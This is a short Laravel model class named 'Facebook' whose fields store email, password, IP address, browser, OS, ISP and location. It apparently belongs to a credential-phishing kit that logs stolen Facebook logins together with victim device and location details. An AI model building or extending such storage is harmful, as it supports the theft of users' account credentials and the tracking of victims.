<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Facebook extends Model
{
    use HasFactory;

    protected $fillable = [
        'email',
        'password',
        'ip',
        'os',
        'browser',
        'isp',
        'city',
        'region',
        'country',
        'timezone',
    ];
}
